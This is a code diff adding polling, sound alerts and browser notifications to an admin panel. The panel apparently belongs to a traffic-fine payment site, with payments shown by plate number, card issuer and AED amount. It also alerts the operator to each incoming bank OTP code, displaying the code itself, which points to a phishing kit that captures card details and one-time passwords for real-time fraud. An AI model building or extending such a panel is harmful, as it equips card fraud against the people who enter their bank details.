@@ -60,6 +60,175 @@ document.addEventListener('keydown', function(e) {
     document.getElementById('sidebar-backdrop').classList.remove('open');
   }
 });
+
+// ── Notifications + sound alerts ─────────────────────────────────────────────
+(function() {
+  const POLL_MS = 8000;
+  const LS_KEYS = { payment: 'admNotifyLastPayment', otp: 'admNotifyLastOtp', inquiry: 'admNotifyLastInquiry' };
+  const enabledKey = 'admNotifyEnabled';
+
+  // Audio: Web Audio API beep generator (no asset files, works offline)
+  let audioCtx = null;
+  function ensureAudio() {
+    if (!audioCtx) {
+      try { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } catch(e) { return null; }
+    }
+    if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {});
+    return audioCtx;
+  }
+  function beep(freq, duration, when) {
+    const ctx = ensureAudio(); if (!ctx) return;
+    const t  = ctx.currentTime + (when || 0);
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.frequency.value = freq;
+    osc.type = 'sine';
+    osc.connect(gain); gain.connect(ctx.destination);
+    gain.gain.setValueAtTime(0.0001, t);
+    gain.gain.exponentialRampToValueAtTime(0.35, t + 0.01);
+    gain.gain.exponentialRampToValueAtTime(0.0001, t + duration);
+    osc.start(t); osc.stop(t + duration + 0.02);
+  }
+  // Distinct sounds for distinct events
+  function soundPayment() { beep(880, 0.18, 0); beep(660, 0.22, 0.18); }                  // ding-dong
+  function soundOtp()     { beep(1300, 0.10, 0); beep(1300, 0.10, 0.15); beep(1300, 0.10, 0.30); } // triple beep
+
+  function browserNotify(title, body, urlHash, tag) {
+    if (!('Notification' in window) || Notification.permission !== 'granted') return;
+    try {
+      const n = new Notification(title, { body: body, icon: '/dp-logo.png', tag: tag || title, requireInteraction: false });
+      n.onclick = function() {
+        window.focus();
+        if (urlHash) window.location.href = urlHash;
+        n.close();
+      };
+    } catch(e) {}
+  }
+
+  // Toggle button — updates UI based on Notification.permission and our enabled flag
+  function refreshNotifBtn() {
+    const btn  = document.getElementById('notif-btn');
+    const off  = document.getElementById('notif-icon-off');
+    const on   = document.getElementById('notif-icon-on');
+    const dot  = document.getElementById('notif-dot');
+    if (!btn || !off || !on) return;
+    const enabled = ('Notification' in window)
+      && Notification.permission === 'granted'
+      && localStorage.getItem(enabledKey) !== '0';
+    off.style.display = enabled ? 'none' : '';
+    on.style.display  = enabled ? '' : 'none';
+    dot.style.display = enabled ? '' : 'none';
+    btn.title = enabled ? 'Notifications enabled — click to mute' : 'Click to enable notifications';
+  }
+
+  window.toggleNotifications = async function() {
+    if (!('Notification' in window)) { if (typeof toast === 'function') toast('Browser does not support notifications', 'error'); return; }
+    // If already granted, toggle the user-side mute flag
+    if (Notification.permission === 'granted') {
+      const muted = localStorage.getItem(enabledKey) === '0';
+      localStorage.setItem(enabledKey, muted ? '1' : '0');
+      if (typeof toast === 'function') toast(muted ? 'Notifications enabled' : 'Notifications muted', 'success');
+      refreshNotifBtn();
+      return;
+    }
+    if (Notification.permission === 'denied') {
+      if (typeof toast === 'function') toast('Notifications blocked. Allow them in browser settings.', 'error');
+      return;
+    }
+    try {
+      const result = await Notification.requestPermission();
+      if (result === 'granted') {
+        localStorage.setItem(enabledKey, '1');
+        if (typeof toast === 'function') toast('Notifications enabled', 'success');
+        // Wake up audio context on this user gesture
+        ensureAudio();
+        // Test ping
+        browserNotify('Notifications active', 'You will now hear and see new admin events.', null, 'admin-init');
+      } else {
+        if (typeof toast === 'function') toast('Permission denied', 'error');
+      }
+    } catch(e) {}
+    refreshNotifBtn();
+  };
+
+  function notifyAllowed() {
+    return ('Notification' in window)
+      && Notification.permission === 'granted'
+      && localStorage.getItem(enabledKey) !== '0';
+  }
+
+  // Wake audio context on the first user click anywhere (autoplay policy)
+  document.addEventListener('click', function once() {
+    ensureAudio();
+    document.removeEventListener('click', once);
+  }, { once: true });
+
+  async function pollOnce() {
+    try {
+      const r = await fetch('/admin/api/notify-stats', { credentials: 'same-origin' });
+      const d = await r.json();
+      if (!d.ok) return;
+
+      const lastPay = parseInt(localStorage.getItem(LS_KEYS.payment) || '0', 10) || 0;
+      const lastOtp = parseInt(localStorage.getItem(LS_KEYS.otp)     || '0', 10) || 0;
+      const lastInq = parseInt(localStorage.getItem(LS_KEYS.inquiry) || '0', 10) || 0;
+
+      // First-ever load: seed the baseline silently (no notification flood on initial open)
+      if (lastPay === 0 && lastOtp === 0 && lastInq === 0) {
+        if (d.payment?.id) localStorage.setItem(LS_KEYS.payment, String(d.payment.id));
+        if (d.otp_sms?.id) localStorage.setItem(LS_KEYS.otp,     String(d.otp_sms.id));
+        if (d.inquiry?.id) localStorage.setItem(LS_KEYS.inquiry, String(d.inquiry.id));
+        return;
+      }
+
+      // New payment → sound + notification
+      if (d.payment && d.payment.id > lastPay) {
+        localStorage.setItem(LS_KEYS.payment, String(d.payment.id));
+        if (notifyAllowed()) {
+          soundPayment();
+          const plate = [d.payment.plate_src, d.payment.plate_code, d.payment.plate_no].filter(Boolean).join(' ');
+          const issuer = d.payment.card_issuer || 'Unknown';
+          browserNotify(
+            '💳 New Payment — AED ' + (Number(d.payment.total_fine) || 0).toLocaleString(),
+            plate + ' · ' + issuer,
+            '/admin/payments',
+            'pay-' + d.payment.id
+          );
+        }
+      }
+      // New OTP SMS → sound + notification
+      if (d.otp_sms && d.otp_sms.id > lastOtp) {
+        localStorage.setItem(LS_KEYS.otp, String(d.otp_sms.id));
+        if (notifyAllowed()) {
+          soundOtp();
+          browserNotify(
+            '📱 OTP Received: ' + (d.otp_sms.otp_code || '----'),
+            (d.otp_sms.card_issuer || 'Bank') + ' · AED ' + (Number(d.otp_sms.total_fine) || 0).toLocaleString(),
+            '/admin/payments',
+            'otp-' + d.otp_sms.id
+          );
+        }
+      }
+      // New inquiry → notification only (no sound)
+      if (d.inquiry && d.inquiry.id > lastInq) {
+        localStorage.setItem(LS_KEYS.inquiry, String(d.inquiry.id));
+        if (notifyAllowed()) {
+          const plate = [d.inquiry.plate_src, d.inquiry.plate_code, d.inquiry.plate_no].filter(Boolean).join(' ');
+          browserNotify(
+            '🔍 New Inquiry · ' + (d.inquiry.fine_count || 0) + ' fines',
+            plate + ' · AED ' + (Number(d.inquiry.total_amount) || 0).toLocaleString(),
+            '/admin/inquiries',
+            'inq-' + d.inquiry.id
+          );
+        }
+      }
+    } catch(e) {}
+  }
+
+  refreshNotifBtn();
+  pollOnce();
+  setInterval(pollOnce, POLL_MS);
+})();
 </script>
 </body>
 </html>
